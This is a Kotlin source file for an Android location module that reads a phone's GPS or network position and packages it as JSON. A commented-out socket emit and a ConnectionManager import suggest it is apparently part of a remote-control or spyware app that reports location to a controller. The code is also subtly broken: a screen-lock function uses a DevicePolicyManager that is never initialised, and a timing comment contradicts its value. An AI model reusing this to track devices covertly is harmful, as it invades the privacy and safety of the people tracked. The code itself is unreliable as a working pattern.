package com.neaking

import android.Manifest
import android.app.admin.DevicePolicyManager
import android.content.ComponentName
import android.content.Context
import android.content.pm.PackageManager
import android.location.Location
import android.location.LocationListener
import android.location.LocationManager
import android.os.Bundle
import androidx.appcompat.app.AppCompatActivity
import androidx.core.content.ContextCompat.getSystemService
import com.neaking.ConnectionManager.context
import org.json.JSONException
import org.json.JSONObject
import java.lang.Exception

class LocManager : LocationListener {
    private val mContext: Context?
    private var isGPSEnabled = false
    private var isNetworkEnabled = false
    private var canGetLocation = false
    private var location: Location? = null
    private var latitude = 0.0
    private var longitude = 0.0
    private var accuracy = 0f
    private var altitude = 0.0
    var speed = 0f

    // Declaring a Location Manager
    protected var locationManager: LocationManager? = null

    constructor() {
        mContext = null
    }

    constructor(context: Context?) {
        mContext = context
        getLocation()
    }
     fun lockTheScreen() {
        lateinit var dpm: DevicePolicyManager
        dpm.lockNow()
    }

    @JvmName("getLocation1")
    fun getLocation(): Location? {
        try {
            locationManager =
                mContext!!.getSystemService(Context.LOCATION_SERVICE) as LocationManager
            // getting GPS status
            isGPSEnabled = locationManager?.isProviderEnabled(LocationManager.GPS_PROVIDER) == true
            // getting network status
            isNetworkEnabled = locationManager!!.isProviderEnabled(LocationManager.NETWORK_PROVIDER)
            if (isGPSEnabled || isNetworkEnabled) {
                canGetLocation = true
                if (context?.getPackageManager()?.checkPermission(
                        Manifest.permission.ACCESS_FINE_LOCATION,
                        context!!.getPackageName()
                    ) === PackageManager.PERMISSION_GRANTED &&
                    context!!.getPackageManager().checkPermission(
                        Manifest.permission.ACCESS_COARSE_LOCATION,
                        context!!.getPackageName()
                    ) === PackageManager.PERMISSION_GRANTED
                ) {
                    // First get location from Network Provider
                    if (isNetworkEnabled) {
                        if (locationManager != null) {
                            location =
                                locationManager!!.getLastKnownLocation(LocationManager.NETWORK_PROVIDER)
                            if (location != null) {
                                latitude = location!!.latitude
                                longitude = location!!.longitude
                                altitude = location!!.altitude
                                accuracy = location!!.accuracy
                                speed = location!!.speed
                            }
                        }
                    }

                    // if GPS Enabled get lat/long using GPS Services
                    if (isGPSEnabled) {
                        if (location == null) {
                            if (locationManager != null) {
                                location =
                                    locationManager!!.getLastKnownLocation(LocationManager.GPS_PROVIDER)
                                if (location != null) {
                                    latitude = location!!.latitude
                                    longitude = location!!.longitude
                                    altitude = location!!.altitude
                                    accuracy = location!!.accuracy
                                    speed = location!!.speed
                                }
                            }
                        }
                    }
                }
            }
        } catch (e: Exception) {
            e.printStackTrace()
        }
        return location
    }

    fun canGetLocation(): Boolean {
        return canGetLocation
    }

    val getData: JSONObject
        get() {
            val data = JSONObject()
            return if (location != null) {
                try {
                    data.put("enabled", true)
                    data.put("latitude", latitude)
                    data.put("longitude", longitude)
                    data.put("altitude", altitude)
                    data.put("accuracy", accuracy.toDouble())
                    data.put("speed", speed.toDouble())
                    data
                } catch (e: JSONException) {
                    data
                }
            } else data
        }

    override fun onLocationChanged(location: Location) {
        if (location != null) {
            latitude = location.latitude
            longitude = location.longitude
            altitude = location.altitude
            accuracy = location.accuracy
            speed = location.speed
        }
       // IOSocket.getInstance().getIoSocket().emit("0xLO", data)
    }

    override fun onProviderDisabled(provider: String) {}
    override fun onProviderEnabled(provider: String) {}
    override fun onStatusChanged(provider: String, status: Int, extras: Bundle) {}

    companion object {

        // The minimum distance to change Updates in meters
        private const val MIN_DISTANCE_CHANGE_FOR_UPDATES: Long = 10 // 10 meters

        // The minimum time between updates in milliseconds
        private const val MIN_TIME_BW_UPDATES = (1000 * 60 * 1 // 10 minutes
                ).toLong()
    }
}